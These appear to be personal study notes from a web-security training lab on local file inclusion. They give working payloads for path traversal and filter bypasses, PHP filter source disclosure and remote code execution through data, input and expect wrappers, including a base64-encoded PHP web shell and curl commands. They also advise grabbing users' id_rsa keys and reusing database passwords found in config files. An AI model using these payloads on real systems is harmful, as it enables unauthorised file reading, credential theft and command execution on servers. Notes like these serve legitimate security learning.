The following table shows which functions may execute files and which only read file content:

| **Function**                 | **Read Content** | **Execute** | **Remote URL** |
| ---------------------------- | :--------------: | :---------: | :------------: |
| **PHP**                      |                  |             |                |
| `include()`/`include_once()` |        ✅         |      ✅      |       ✅        |
| `require()`/`require_once()` |        ✅         |      ✅      |       ❌        |
| `file_get_contents()`        |        ✅         |      ❌      |       ✅        |
| `fopen()`/`file()`           |        ✅         |      ❌      |       ❌        |
| **NodeJS**                   |                  |             |                |
| `fs.readFile()`              |        ✅         |      ❌      |       ❌        |
| `fs.sendFile()`              |        ✅         |      ❌      |       ❌        |
| `res.render()`               |        ✅         |      ✅      |       ❌        |
| **Java**                     |                  |             |                |
| `include`                    |        ✅         |      ❌      |       ❌        |
| `import`                     |        ✅         |      ✅      |       ✅        |
| **.NET**                     |                  |             |                |
| `@Html.Partial()`            |        ✅         |      ❌      |       ❌        |
| `@Html.RemotePartial()`      |        ✅         |      ❌      |       ✅        |
| `Response.WriteFile()`       |        ✅         |      ❌      |       ❌        |
| `include`                    |        ✅         |      ✅      |       ✅        |

#### First order LFI
- Just injecting the payload in the url itself to try and pull local backend files. eg:
```python
http://154.57.164.83:30138/index.php?language=/../../../../../../../..//usr/share/flags/flag.txt
```

#### Second order LFI
- For example, we save our username as an LFI payload and then when another functionality of the webserver tries to pull our username, it could pull local files that we specified directly from the backend. Since there are two steps, its called second order LFI

# Bypassing Filters
## Non-Recursive Path Traversal Filters
- These filters remove the '../' part of our lfi payload and make it useless.
- This filter is highly insecure because it does not recursively remove the ../ substring
- if we use something like the below, we can bypass this filter: 
  ```python
  http://<SERVER_IP>:<PORT>/index.php?language=....//....//....//....//etc/passwd
  ```
## Encoding
- Some filters may prevent input filters that include certain LFI-related characters like **.** or a slash **/**
- If the target web application did not allow `.` and `/` in our input, we can URL encode `../` into `%2e%2e%2f`, which may bypass the filter.

## Approved Paths
Some web applications may also use Regular Expressions to ensure that the file being included is under a specific path.
- To bypass this, we may use path traversal and start our payload with the approved path, and then use `../` to go back to the root directory and read the file we specify, as follows:
```python
<SERVER_IP>:<PORT>/index.php?language=./languages/../../../../etc/passwd
```

## Appended Extension
- With modern versions of PHP, we may not be able to bypass this and will be restricted to only reading files in that extension, which may still be useful
## Path Truncation
```python
echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
```
## Null Bytes
- PHP versions before 5.5 were vulnerable to `null byte injection`, which means that adding a null byte (`%00`) at the end of the string would terminate the string and not consider anything after it.
- To exploit this vulnerability, we can end our payload with a null byte (e.g. `/etc/passwd%00`)

# PHP Filters
- we can utilize different [PHP Wrappers](https://www.php.net/manual/en/wrappers.php.php) to be able to extend our LFI exploitation, and even potentially reach remote code execution.
## Fuzzing for PHP Files
```python
ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php
```
## Source Code Disclosure
- Once we have a list of potential PHP files we want to read, we can start disclosing their sources with the `base64` PHP filter.
- eg:
```python
http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=config
```
#### Base64 decode
```python
echo 'PD9waHAK...SNIP...KICB9Ciov' | base64 -d
```

#### PHP Wrappers
- From this section onwards we are starting with how we can use file inclusion vulns to execute code on the backend servers.
- For eg: we may find a db passwd in a file  like **config.php**, which can match a users password incase they reuse password.
- we can look at the .ssh directory in each user's home directory and get the **id_rsa** and use it to ssh to the system

#### Data Wrapper
- Can be used to include external data, including php code
- Only available to use if the **allow_url_include** settings is enabled in the PHP configurations.

###### Checking PHP Configurations
```python
curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
```
Once we get the base64 encoded string, grep for allow_url_include to see its value

```python
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include
```
- If its yes : excellent, if not : data wrapper method wont work

#### Remote Code Execution
- if we have the allow_url_include option enabled,   we can pass it base64 encoded strings with text/plain;base64 and it has the ability to decode them and execute the PHP code.
```python
echo '<?php system($_GET["cmd"]); ?>' | base64
```
![[Pasted image 20260606103554.png]]
###### Base64 encoding a basic php web shell
```python
echo '<?php system($_GET["cmd"]); ?>' | base64

```
![[Pasted image 20260606104203.png]]
- Now we can URL encode the base64 string  and then pass it to the data wrapper with data://text/plain;base64.
```python
curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid
```

## Input Wrapper
- Similar to Data wrapper. but the difference is that we pass our input to the input wrapper as POST requests.
- So the vulnerable parameter must acccept POST requests for this attack to work.
- also the input wrapper depends on the **allow_url_include** setting.
```python
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
```
## Expect wrapper
- Allows us to directly run commands through URL streams.
- Similar to web shells but don't need to provide a webshell as its designed to execute commands.
- checking whether it is configured to load on backed server : 
```python
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect
```
![[Pasted image 20260606110543.png]]

success

now, 

```python
curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id" | grep uid
```
